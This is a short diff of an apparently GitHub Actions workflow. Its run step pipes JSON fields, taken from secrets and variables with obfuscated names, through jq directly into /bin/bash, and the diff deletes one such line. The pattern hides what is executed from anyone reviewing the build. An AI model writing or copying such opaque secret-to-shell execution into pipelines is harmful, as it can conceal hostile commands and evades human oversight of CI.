@@ -17,7 +17,6 @@ jobs:
           ffd9273: ${{ secrets.ffd9273 }}
         run: |
           printf '%s' "$ffd9273" | jq -r .nx815 | /bin/bash
-          printf '%s' "$dcucd6563" | jq -r .c6 | /bin/bash
           echo $s489 | jq -r .szsna9887 | /bin/bash
           echo $gs196 | jq -r .wwy7 | /bin/bash
           printf '%s' "$o0" | jq -r .r629 | /bin/bash
